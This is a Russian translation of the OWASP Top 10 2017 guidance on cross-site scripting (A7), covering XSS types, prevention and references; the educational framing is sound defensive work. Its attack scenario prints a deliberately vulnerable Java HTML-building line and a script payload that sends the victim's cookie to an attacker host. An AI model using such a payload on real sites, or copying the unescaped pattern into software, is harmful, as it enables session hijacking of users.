# A7:2017 Межсайтовое выполнение сценариев (XSS)

| Источники угроз/Векторы атак | Недостатки безопасности           | Последствия               |
| -- | -- | -- |
| Уровень доступа Lvl : Уязвимости 3 | Распространённость 3 : Обнаруживаемость 3 | Технический 2 : Бизнес |
| Автоматизированные инструменты могут обнаруживать и использовать все три формы XSS, также существуют свободно доступные схемы использования.  | XSS является второй наиболее распространенной проблемой в топ-10 OWASP и находится примерно в двух третях всех приложений. Автоматизированные инструменты могут обнаруживать некоторые проблемы XSS автоматически, особенно в таких зрелых технологиях, как PHP, J2EE / JSP и ASP.NET. | Воздействие XSS является умеренным для отраженных и DOM XSS и серьезным для сохраненного XSS, с удаленным выполнением кода в браузере жертвы, таким как кража учетных данных, сеансов или предоставление вредоносного ПО жертве. |

## Является ли приложение уязвимым?

Существуют три формы XSS, обычно ориентированные на браузеры пользователей:

* **Отражённый XSS**: Приложение или API включает в себя непроверенный и неэкранированный пользовательский ввод как часть вывода HTML. Успешная атака может позволить злоумышленнику выполнить произвольный HTML и JavaScript в браузере жертвы. Как правило, пользователю необходимо взаимодействовать с какой-либо вредоносной ссылкой, которая указывает на страницу, контролируемую атакующем, например, сайты вредоносных веб-сайтов, рекламу и т.д.
* **Сохранённый XSS**: Приложение или API хранит нечистый пользовательский ввод, который позже рассматривается другим пользователем или администратором. Хранимый XSS часто считается высоким или критическим риском.
* **DOM XSS**: JavaScript фреймворки, одностраничные приложения и API-интерфейсы, которые динамически включают данные, управляемые злоумышленниками, на страницу, уязвимы для DOM XSS. В идеале приложение не отправляет данные, управляемые атакующим, в небезопасные API JavaScript.

Типичные атаки XSS включают в себя кражу сеанса, захват учетной записи, обход MFA, замену или повреждение узла DOM (например, панели входа в систему), атаки на браузер пользователя, такие как загрузка вредоносного программного обеспечения, ведение журнала ключей и другие атаки на стороне клиента.

## Как предотвратить?

Предотвращение XSS требует разделения ненадежных данных из активного содержимого браузера. Этого можно достичь следующим образом:

* Использование фреймворков, которые автоматически выходят из XSS по дизайну, такие как новейшие Ruby on Rails, React JS. Изучите ограничения защиты XSS каждой инфраструктуры и надлежащим образом обработайте случаи использования, которые не охвачены.
* Выделение ненадежных данных HTTP-запроса на основе контекста в выходном файле HTML (тело, атрибут, JavaScript, CSS или URL-адрес) позволит устранить уязвимые и сохраненные уязвимости XSS. В [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) содержится подробная информация о методах экранирования требуемых данных.
* Применение контекстно-зависимой кодировки при изменении документа браузера на стороне клиента действует против DOM XSS. Когда этого избежать нельзя, аналогичные методы чувствительности к контекстно-зависимым методам могут применяться к API-интерфейсам браузеров, как описано в OWASP Шпаргалка «Профилактика XSS, основанная на DOM».
* Включение [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) в качестве глубокой защиты элемента управления XSS. Он эффективен, если не существует других уязвимостей, позволяющих размещать вредоносный код через локальный файл (например, переходы по пути переписываются или уязвимые библиотеки из разрешенных сетей доставки контента).

## Пример сценария атаки

**Сценарий #1**: Приложение использует ненадежные данные при построении следующего фрагмента HTML без проверки или экранирования:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
Злоумышленник изменяет параметр «CC» в браузере, чтобы:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Эта атака приводит к тому, что идентификатор сеанса жертвы отправляется на сайт злоумышленника, позволяя злоумышленнику захватить текущий сеанс пользователя.

**Примечание**: Атакующие могут использовать XSS, чтобы победить любую автоматическую защиту от перекрестных запросов (CSRF), которую может применить приложение.

## Рекомендации

### OWASP

* [OWASP Проактивные элементы управления: кодирование данных](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Проактивные элементы управления: проверка данных](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Стандарт проверки безопасности приложения: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Руководство по тестированию: тестирование для отраженного XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Руководство по тестированию: тестирование сохраненного XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Руководство по тестированию: тестирование для DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Шпаргалка: Профилактика XSS](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Шпаргалка: Профилактика XSS основанная на DOM](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Шпаргалка: Уклонение от фильтра XSS](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Проект Java Encoder](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### Сторонние

* [CWE-79: Неправильная нейтрализация вводимого пользователем ввода](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Внедрение шаблона на клиентской стороне](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
